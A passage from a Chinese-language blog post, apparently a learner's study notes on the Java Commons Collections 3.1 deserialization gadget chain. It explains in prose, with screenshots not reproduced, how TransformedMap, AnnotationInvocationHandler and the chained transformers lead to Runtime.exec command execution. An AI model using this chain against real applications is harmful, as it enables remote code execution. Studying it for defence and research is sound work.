src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/286bd714c894d8bf2db07f8f04e02323.png" alt="截图">效果是</p><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/63a36712d33061393ef3aa3974c6e165.png" alt="截图"> </p><p>最后的目标是回到readObject，所以此时要寻找不同的方法来调用transform（视频原话）</p><hr><h2 id="MAP"><a href="#MAP" class="headerlink" title="MAP"></a>MAP</h2><p>在TransformedMap类里面可以找到调用了transfrom方法的位置</p><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/78ce747963117a1a74432392b4fae2c8.png" alt="截图"></p><p>而valueTransformer是TransformedMap构造函数中的一部分，也就是可控<img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/fdb06310411b2b8c0eb1c15a9bd010a4.png" alt="截图"></p><p>如下构造就可以对invokerTransformer调用tansform方法（由于构造函数是保护的，这里用到decorate装饰器）</p><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/bbcf05b0825c29bc8168c9b99b41ed4f.png" alt="截图"></p><p>继续向上寻找发现是TransformedMap的父类的MapEntry类重写了setValue方法</p><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/1858e0f761cc2bc3e7092ea2b0a6a5ed.png" alt="截图"></p><p>则可以如下，构造一个TransformedMap并且调用setValue即可（让TransformedMap的value为构造的invokertransformer然后通过setValue调用transform）<img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/5cfdd45bdae2b2417775ed46616fd7e6.png" alt="截图"></p><p>现在则需要一个可以遍历数组的地方并且需要value可控或者不同名的调用了setValue</p><hr><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>pop链的最后一步<img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/3b63106246b1c42b6b3edf765722022d.png" alt="截图"></p><p>满足两个if条件后即可调用setvalue</p><p><strong>但是这个类是一个default类，需要用反射创建，并且可以看见他的构造函数中的第一个参数是一个注解类（如Override）</strong><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/1e001eb8613399c766028cca2208c03f.png" alt="截图"></p><p>此时有三个问题：</p><p><strong>1.如何通过if判断来进入这个setvalue中</strong></p><p><strong>2.setValue貌似不可控</strong></p><p><strong>3.Runtime对象本身是不可序列化的，需要通过反射</strong></p><hr><h2 id="Runtime实现反射调用"><a href="#Runtime实现反射调用" class="headerlink" title="Runtime实现反射调用"></a>Runtime实现反射调用</h2><p><u><strong>解决Runtime不可序列化的问题</strong></u><br>正常情况，由于Runtime对象构造函数是私有的，需要通过getRuntime方法来获取这个对象</p><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/e50396f2a799915ae1a443566d136c8a.png" alt="截图"></p><p>上图，<u><strong>通过.class获取了Runtime类，然后getMethod反射获取getRuntime方法，然后调用这个方法，获取r这个Runtime实例化对象，最后反射获取exec方法并且在r上调用</strong></u></p><p>转换为InvokerTransform类中则是</p><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/c98fce6b6222229e8bc9037b6b53c8bb.png" alt="截图"></p><h3 id="chainedtransformer"><a href="#chainedtransformer" class="headerlink" title="chainedtransformer"></a>chainedtransformer</h3><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/ff2051707c278f1d4568df83e5ec4438.png" alt="截图"></p><p>这时候通过chainedtransform实现循环调用来使得调用更加简洁</p><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/ade26093c15bbd94bc93ae52b3c6e75e.png" alt="截图"></p><hr><h2 id="进入if语句"><a href="#进入if语句" class="headerlink" title="进入if语句"></a>进入if语句</h2><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/13d3c235cdee3f76a831e4b5adcf462f.png" alt="截图"></p><p>1.通过getKey来获取传入的memberValue中的键是否存在于menberTypes中</p><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/950f13a925722aa8a01ef421ce1c21bc.png" alt="截图"></p><p>如上，反序列化入口获取了type参数也就是下面的Override.class<img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/96228eadb7d6edc8fcf4d351ebcbdd06.png" alt="截图"></p><p>接着获取了这个类中的成员方法，检查poc中传入的键在这个类中的成员方法终会是否存在</p><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/85b2366957f5b394f8191f99fefe59a2.png" alt="截图"></p><p>则传入一个有成员方法的类并且将key改成他的一个方法名</p><p>如Target的value方法<img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/51cc8f6c209cda4b5236f950aae54f76.png" alt="截图"></p><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/346ac98b2858372421dd9a0f353b66e2.png" alt="截图">如上修改即可</p><p>2.<img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/2814ca791e8398adc40537133b3e1e50.png" alt="截图"></p><p>即检查是否可以强转，这里不需要绕过</p><hr><h2 id="实现可控SetValue"><a href="#实现可控SetValue" class="headerlink" title="实现可控SetValue"></a>实现可控SetValue</h2><p>正常而言，这里会调用</p><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/60e389a8a285f78d23d2860b183d2f89.png" alt="截图"></p><p>也就是这里的transform的value不可控<img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/8fb0727ffebea79221cd577f1550031b.png" alt="截图"></p><p>也就相当于要把下面的语句换成上面的语句（实现value可控）</p><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/2f8471b5faf8e18282ad8fc0167cc2b1.png" alt="截图"></p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/ff2051707c278f1d4568df83e5ec4438.png" alt="截图"></p><p>其transformer方法直接返回自身的一个变量同时可控<br>就可以利用它通过Runtime.getRuntime()创建一个Runtime实例</p><p>此时即可转换成poc中的</p><br/><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/255b549250c082d6699e738adcbddce0.png" alt="截图"></p><hr><h2 id="pop链回溯"><a href="#pop链回溯" class="headerlink" title="pop链回溯"></a>pop链回溯</h2><p>通过反射实例化了AnnotationInvocationHandler类—&gt;对他的value遍历并且调用setvalue，最终来到transform方法(这一步为了实现可控SetValue借助到ConstantTransformer类)—&gt;在value中，我们恶意构造的chainTransformer类实现命令执行</p><br/><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次看java的链子，之前连ctf的java题都没怎么做过，没啥基础，看了点反射跟基本语法就强行看完了，感觉看懂了但是让自己复现还是很困难（语法不清晰），过段时间自己再回来复习一下吧</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
